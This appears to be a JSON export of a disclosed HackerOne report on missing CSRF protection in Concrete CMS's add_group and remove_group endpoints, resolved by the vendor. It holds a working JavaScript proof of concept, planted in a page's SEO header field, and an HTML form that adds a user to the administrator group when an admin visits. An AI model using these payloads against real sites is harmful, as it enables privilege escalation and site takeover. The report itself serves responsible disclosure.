{"id":64184,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NDE4NA==","url":"https://hackerone.com/reports/64184","title":"No csrf protection on index.php/ccm/system/user/add_group, index.php/ccm/system/user/remove_group","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-28T17:58:01.319Z","submitted_at":"2015-05-28T17:58:01.319Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jmpalk","url":"/jmpalk","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concretecms","handle":"concretecms","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/mhbwznkvtxed2330krmlxr2bpqa8/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22concrete_CMS_logo_-_handat2x.png%22%3B%20filename%2A%3DUTF-8%27%27concrete_CMS_logo_-_handat2x.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151421Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a7faaf14a9b869a8930bb04378a9c80a33a63a9b4263a5783980c32992990ee9","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/mhbwznkvtxed2330krmlxr2bpqa8/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22concrete_CMS_logo_-_handat2x.png%22%3B%20filename%2A%3DUTF-8%27%27concrete_CMS_logo_-_handat2x.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151421Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b1ae163b56806cf6d3ad0e524fabebd3a4b392d549d44958f3f292952379e137"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Concrete CMS","twitter_handle":"concrete_cms","website":"https://www.concretecms.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-08-26T20:03:22.151Z","bug_reporter_agreed_on_going_public_at":"2015-07-27T20:03:11.992Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"crayons\r\n\r\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. \r\n\r\n\r\n\r\nA malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.\r\n\r\nFor example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the \"Extra Header Content\" section of the page's SEO module:\r\n\r\n\u003c!-- \r\n\u003cscript language=\"JavaScript\" type=\"text/javascript\"\u003e\r\n \r\n     window.onload = promoteUser();\r\n \r\n     function promoteUser() {\r\n       var XHR = new XMLHttpRequest();\r\n       var urlEncodedData = \"\";\r\n       var urlEncodedDataPairs = [];\r\n       var name;\r\n       var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\r\n \r\n       for(name in data) {\r\n         urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\r\n       } //end for(name in data)\r\n \r\n       urlEncodedData = urlEncodedDataPairs.join('\u0026').replace(/%20/g, '+');\r\n \r\n       XHR.addEventListener('load', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Yeah! Data sent and response loaded.');\r\n         });\r\n \r\n       XHR.addEventListener('error', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Oops. Something went wrong.');\r\n         });\r\n \r\n       XHR.open('POST', 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/add_group');\r\n// alt:  XHR.open('POST', // 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/remove_group');\r\n\r\n       XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\r\n       XHR.setRequestHeader('Content-Length', urlEncodedData.length);\r\n \r\n       XHR.send(urlEncodedData);\r\n \r\n     }//end promoteUser\r\n\u003c/script\u003e\r\n\r\n--\u003e\r\n\r\nAs an aside, I'm not sure whether allowing any user to add javascript to the \"Extra Header Content\" field of a page's SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-08-26T20:03:12.371Z","allow_singular_disclosure_after":-193345868.94131163,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":431903,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was in a hurry yesterday, and decided overnight I could clean up the report and POC. See below.\nCrayons\n\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group.\n\nConsequently, an attacker could craft a malicious POST request that will add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site. This includes adding members to the administrator group, giving the attacker full control of the site.\n\nPossibly exploitable from outside the site, this can definitely be triggered from any page where the attacker has write access to the SEO information on the page.\n\nPOC\n\nAs an administrator, create a new blog page in concrete5, and give write access/edit permission to another, non-administrator, user.\n\nIn the \"Extra Header Content\" section of the page's SEO module, add the following javascript:\n\n\u003c!-- \n\u003cscript language=\"JavaScript\" type=\"text/javascript\"\u003e\n\nwindow.onload = promoteUser();\n\n function promoteUser() {\n   var XHR = new XMLHttpRequest();\n   var urlEncodedData = \"\";\n   var urlEncodedDataPairs = [];\n   var name;\n   var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\n\n   for(name in data) {\n     urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\n   } //end for(name in data)\n\n   urlEncodedData = urlEncodedDataPairs.join('\u0026').replace(/%20/g, '+');\n\n   XHR.addEventListener('load', function(event){\n     //alert boxes for testing purposes only\n     //alert('Yeah! Data sent and response loaded.');\n     });\n\n   XHR.addEventListener('error', function(event){\n     //alert boxes for testing purposes only\n     //alert('Oops. Something went wrong.');\n     });\n\n   XHR.open('POST', 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/add_group');\n\n   XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n   XHR.setRequestHeader('Content-Length', urlEncodedData.length);\n\n   XHR.send(urlEncodedData);\n\n }//end promoteUser\n\n\u003c/script\u003e\n\n--\u003e\n\nAs the non administrator user, save and publish the page\n\nAs the administrator, browse to the new blog page. \n\nThe non-privileged user should now have administrator privileges the next time s/he logs in.\n\nThe same attack can be used to remove a user from a group by substituting 'remove_group' for 'add_group' in the XHR.open statement in the JS above.","automated_response":false,"created_at":"2015-05-29T12:34:58.383Z","updated_at":"2015-05-29T12:34:58.383Z","actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":440173,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This could also be exploited via an HTML form on an external site. For example:\n\n\n\n     \u003cform action=\"http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group\" method=\"post\"\u003e\n\n      \u003cinput type=\"hidden\" name=\"gID\" value=\"3\" /\u003e\n      \u003cinput type=\"hidden\" name=\"uID\" value=\"6\" /\u003e\n\n      \u003cbutton type=\"submit\"\u003eCsrf your site here!\u003c/button\u003e\n\n    \u003c/form\u003e \n","automated_response":false,"created_at":"2015-06-04T02:11:14.297Z","updated_at":"2015-06-04T02:11:14.297Z","actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":475436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My apologies for this sitting, I'm looking into this now.","automated_response":false,"created_at":"2015-06-17T17:02:26.248Z","updated_at":"2015-06-17T17:02:26.248Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":475478,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685","automated_response":false,"created_at":"2015-06-17T17:28:39.577Z","updated_at":"2015-06-17T17:28:39.577Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jmpalk","url":"/jmpalk"},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":527509,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-07-27T20:03:12.115Z","updated_at":"2015-07-27T20:03:12.115Z","first_to_agree":true,"actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":564660,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-08-26T20:03:23.252Z","updated_at":"2015-08-26T20:03:23.252Z","actor":{"url":"/concretecms","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/mhbwznkvtxed2330krmlxr2bpqa8/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22concrete_CMS_logo_-_handat2x.png%22%3B%20filename%2A%3DUTF-8%27%27concrete_CMS_logo_-_handat2x.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151421Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b1ae163b56806cf6d3ad0e524fabebd3a4b392d549d44958f3f292952379e137"},"profile":{"name":"Concrete CMS"}},"genius_execution_id":null,"team_handle":"concretecms","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":158,"category":"team","content":"`add_group` and `remove_group` have no CSRF protection.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":3454,"username":"korvin","name":"Korvin Szanto","bio":"","cleared":false,"website":"https://kor.vin","location":"","created_at":"2014-03-07T22:28:20.340Z","url":"https://hackerone.com/korvin","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBeHFIRGc9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--549314868964d26576f7ed0a726389d7a5ea25e0/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/T04L140KM-U04U5B88T-e325c1f3dfce-1024.jpeg"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}